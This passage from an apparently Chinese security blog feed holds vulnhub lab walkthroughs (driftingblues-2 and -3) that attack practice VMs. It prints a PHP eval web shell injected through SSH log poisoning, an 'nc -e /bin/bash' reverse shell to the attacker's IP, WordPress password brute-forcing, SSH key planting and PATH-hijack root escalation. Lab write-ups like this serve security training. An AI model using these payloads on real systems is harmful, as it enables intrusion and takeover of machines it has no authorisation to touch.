class="token comment">#给权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> hubert@192.168.1.10 <span class="token parameter variable">-i</span> id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180801307.png" alt="image-20240219180801307"></p><p>我们可以在user.txt里面，看到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219180830325.png" alt="image-20240219180830325"></p><h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6)提权"></a>6)提权</h3><p>我们使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219183651011.png" alt="image-20240219183651011"></p><p>我们可以看到熟悉的getinfo,我们进行提权</p><p>执行该程序，根据执行结果发现分别运行了ip addr、cat &#x2F;etc&#x2F;hosts、uname -a命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219183849451.png" alt="image-20240219183849451"></p><p>可以通过修改环境来进行命令劫持提权</p><p>通过修改环境变量让getinfo在调用命令调用到我们伪造的ip命令（在检索环境时会先调用最前面的环境也就是最新写入的环境），来达到提权的效果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp/:<span class="token environment constant">$PATH</span>             把/tmp路径写入到系统路径中<span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">'/bin/bash'</span> <span class="token operator">></span> <span class="token function">ip</span>                       把/bin/bash写入到ip文件中<span class="token punctuation">(</span>相当于创建ip并写入/bin/bash<span class="token punctuation">)</span><span class="token function">chmod</span> +x <span class="token function">ip</span>                                    给ip文件增加执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219184404990.png" alt="image-20240219184404990"></p><p>我们可以看到是root提权，我们进行查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240219184438188.png" alt="image-20240219184438188"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-3</title>
    <link href="http://ms02423.top/2024/02/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-3/"/>
    <id>http://ms02423.top/2024/02/06/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-3/</id>
    <published>2024-02-06T12:21:41.000Z</published>
    <updated>2024-02-06T14:34:59.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get flagsdifficulty: easyabout vm: tested and exported from virtualbox. dhcp and nested  vtx/amdv enabled. you can contact me by email <span class="token keyword">for</span> troubleshooting or  questions.This works better with VirtualBox rather than VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-3,656/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206202713671.png" alt="image-20240206202713671"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206202740200.png" alt="image-20240206202740200"></p><p>靶场网段我们知道是192.168.1.0&#x2F;24,我们进行探测</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203023389.png" alt="image-20240206203023389"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203110854.png" alt="image-20240206203110854"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203247089.png" alt="image-20240206203247089"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203653556.png" alt="image-20240206203653556"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206203922196.png" alt="image-20240206203922196"></p><p>我们扫描到三个目录，一个一个进行访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204008218.png" alt="image-20240206204008218"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204031885.png" alt="image-20240206204031885"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204049741.png" alt="image-20240206204049741"></p><p>发现只有robots.txt目录是有信息的，其他的都没有用</p><h3 id="2-dirsearch目录扫描"><a href="#2-dirsearch目录扫描" class="headerlink" title="2)dirsearch目录扫描"></a>2)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.8 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204405924.png" alt="image-20240206204405924"></p><p>还是只有robots.txt目录，那么我们进行分析即可</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问robots-txt"><a href="#1-访问robots-txt" class="headerlink" title="1)访问robots.txt"></a>1)访问robots.txt</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204456418.png" alt="image-20240206204456418"></p><p>我们继续访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/eventadmins/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204530574.png" alt="image-20240206204530574"></p><p>我们继续访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/littlequeenofspades.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204608365.png" alt="image-20240206204608365"></p><p>我们访问源代码，可以看到一串base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204725055.png" alt="image-20240206204725055"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204828018.png" alt="image-20240206204828018"></p><p>最后解密出来是一个目录，我们进行访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.8&#x2F;adminsfixit.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206204909039.png" alt="image-20240206204909039"></p><p>我们可以看到是ssh日志记录，那么我们可以试试一句话木马连接ssh，会不会被记录</p><h3 id="2-ssh日志记录"><a href="#2-ssh日志记录" class="headerlink" title="2)ssh日志记录"></a>2)ssh日志记录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token string">'&lt;?php @eval($_POST['</span>MS02423<span class="token string">']);?>'</span>@192.168.1.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206205235001.png" alt="image-20240206205235001"></p><p>我们连接蚁剑，发现可以连接成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210144181.png" alt="image-20240206210144181"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210205634.png" alt="image-20240206210205634"></p><p>这样我们就可以反弹shell了</p><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h3><p>方法一:我们使用cmd进行反弹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.8/adminsfixit.php/?cmd<span class="token operator">=</span>system<span class="token punctuation">(</span>%27nc%20-e%20/bin/bash%20192.168.1.9%205555%27<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210921157.png" alt="image-20240206210921157"></p><p>我们可以看到反弹成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206210950397.png" alt="image-20240206210950397"></p><p>方法二:我们使用蚁剑虚拟终端进行反弹</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206211425460.png" alt="image-20240206211425460"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206211450472.png" alt="image-20240206211450472"></p><p>我们可以看到反弹成功，这两个方法都可以试试</p><h3 id="4-SSH密钥"><a href="#4-SSH密钥" class="headerlink" title="4)SSH密钥"></a>4)SSH密钥</h3><p>分析查看靶机内文件，发现home目录下有一个robertj用户，且该用户目录下存在两个文件，user.txt”文件没有权限无法打开，.ssh 目录有可读可写可执行权限，进入 .ssh 目录进行查看，发现目录内没有任何文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206212334888.png" alt="image-20240206212334888"></p><p>继续查看分析，查看ssh配置文件（默认目录&#x2F;etc&#x2F;ssh&#x2F;sshd_config），发现可以公钥登录，并且给出了公钥文件存放目录 &#x2F;home&#x2F;robertj&#x2F;.ssh&#x2F;authorized_keys</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206212709475.png" alt="image-20240206212709475"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206212849011.png" alt="image-20240206212849011"></p><p>尝试把公钥放入.ssh目录内，使用 ssh-keygen工具生成公密钥，并将生成的密钥保存到 &#x2F;home&#x2F;robertj&#x2F;.ssh&#x2F; 目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span class="token parameter variable">-t</span>    指定生成的密钥类型，默认为RSA类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206213858683.png" alt="image-20240206213858683"></p><p>我们可以看到写入成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206220853065.png" alt="image-20240206220853065"></p><p>将生成的公钥内容输出到authorized_keys文件内</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221005812.png" alt="image-20240206221005812"></p><p>查看私钥文件，将内容复制出来，粘贴到本地文件中, 注意要将id_rsa文件的权限修改为与创建时权限一致</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221124000.png" alt="image-20240206221124000"></p><h3 id="5-ssh登录"><a href="#5-ssh登录" class="headerlink" title="5)ssh登录"></a>5)ssh登录</h3><p>我们进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> robertj@192.168.1.8 <span class="token parameter variable">-i</span> <span class="token string">'/home/kali/桌面/1.txt'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221327567.png" alt="image-20240206221327567"></p><p>我们查看user.txt，看到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221416157.png" alt="image-20240206221416157"></p><h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6)提权"></a>6)提权</h3><p>我们使用sudo -l查看，发现没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221623865.png" alt="image-20240206221623865"></p><p>那么我们使用另一条命令，使用 find 命令寻找suid程序，发现一个可疑程序&#x2F;usr&#x2F;bin&#x2F;getinfo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221720045.png" alt="image-20240206221720045"></p><p>执行该程序，根据执行结果发现分别运行了ip addr、cat &#x2F;etc&#x2F;hosts、uname -a命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206221952961.png" alt="image-20240206221952961"></p><p>可以通过修改环境来进行命令劫持提权</p><p>通过修改环境变量让getinfo在调用命令调用到我们伪造的ip命令（在检索环境时会先调用最前面的环境也就是最新写入的环境），来达到提权的效果</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp/:<span class="token environment constant">$PATH</span>             把/tmp路径写入到系统路径中<span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">'/bin/bash'</span> <span class="token operator">></span> <span class="token function">ip</span>                       把/bin/bash写入到ip文件中<span class="token punctuation">(</span>相当于创建ip并写入/bin/bash<span class="token punctuation">)</span><span class="token function">chmod</span> +x <span class="token function">ip</span>                                    给ip文件增加执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206222242713.png" alt="image-20240206222242713"></p><p>我们查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240206222331559.png" alt="image-20240206222331559"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之driftingblues-2</title>
    <link href="http://ms02423.top/2024/02/05/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-2/"/>
    <id>http://ms02423.top/2024/02/05/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdriftingblues-2/</id>
    <published>2024-02-05T10:21:32.000Z</published>
    <updated>2024-02-05T11:58:30.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token punctuation">(</span>it should be <span class="token keyword">on</span> my profile<span class="token punctuation">)</span> <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/driftingblues-2,634/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205182951811.png" alt="image-20240205182951811"></p><h2 id="3-靶场启动"><a href="#3-靶场启动" class="headerlink" title="3.靶场启动"></a>3.靶场启动</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183030629.png" alt="image-20240205183030629"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="1.寻找靶场真实ip"></a>1.寻找靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183345515.png" alt="image-20240205183345515"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183416768.png" alt="image-20240205183416768"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶场真实ip地址为192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183650442.png" alt="image-20240205183650442"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口，服务为ProFTPD发现开启了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="3.web指纹识别"></a>3.web指纹识别</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205183911341.png" alt="image-20240205183911341"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184012854.png" alt="image-20240205184012854"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205185022506.png" alt="image-20240205185022506"></p><p>我们看到是一张图片，可能会有有用的信息，我们一会分析下</p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184152926.png" alt="image-20240205184152926"></p><p>没有有用信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184510672.png" alt="image-20240205184510672"></p><p>扫描到一个登录页面，我们进行查看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7/blog/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184636745.png" alt="image-20240205184636745"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">我们看到cms框架是wordpress，可能是爆破用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.7 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184741763.png" alt="image-20240205184741763"></p><p>扫描到一个&#x2F;blog&#x2F;目录，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7/blog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205184812353.png" alt="image-20240205184812353"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">目前掌握的信息是一个登录页面，一个<span class="token operator">/</span>blog<span class="token operator">/</span>目录<span class="token punctuation">,</span>一张图片<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-图片隐写"><a href="#1-图片隐写" class="headerlink" title="1)图片隐写"></a>1)图片隐写</h3><p>我们分析这张图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205185421131.png" alt="image-20240205185421131"></p><p>使用steghide工具先查看一下图片基本信息,但是需要密码，我们没有密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide <span class="token parameter variable">--info</span> <span class="token string">'/home/kali/桌面/secret.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205185545378.png" alt="image-20240205185545378"></p><p>我们使用stegseek进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stegseek  <span class="token parameter variable">--crack</span> <span class="token string">'/home/kali/桌面/secret.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205190135123.png" alt="image-20240205190135123"></p><p>我们看到没有爆破出来，我们换一个思路，前面我们扫描到cms框架是wordpress，我们可以使用wpscan进行爆破</p><h3 id="2-wpscan爆破"><a href="#2-wpscan爆破" class="headerlink" title="2)wpscan爆破"></a>2)wpscan爆破</h3><p>爆破用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.1.7/blog  <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191446215.png" alt="image-20240205191446215"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191507965.png" alt="image-20240205191507965"></p><p>爆破出来一个用户名是albert</p><p>制作字典</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://192.168.1.7 <span class="token operator">></span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191747850.png" alt="image-20240205191747850"></p><p>爆破密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wpscan <span class="token parameter variable">--url</span> http://192.168.1.7/blog  albert <span class="token parameter variable">--passwords</span>  MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205191943220.png" alt="image-20240205191943220"></p><p>我们看到没有爆破出来，我们换一个字典,使用kali自带的字典——rockyou.txt</p><pre class="line-numbers language-none"><code class="language-none">sudo wpscan --url http:&#x2F;&#x2F;192.168.1.7&#x2F;blog  albert --passwords  &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192554205.png" alt="image-20240205192554205"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">用户名是albert,密码是scotland1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-登录wordpress"><a href="#3-登录wordpress" class="headerlink" title="3)登录wordpress"></a>3)登录wordpress</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.7/blog/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240205192337005.png" 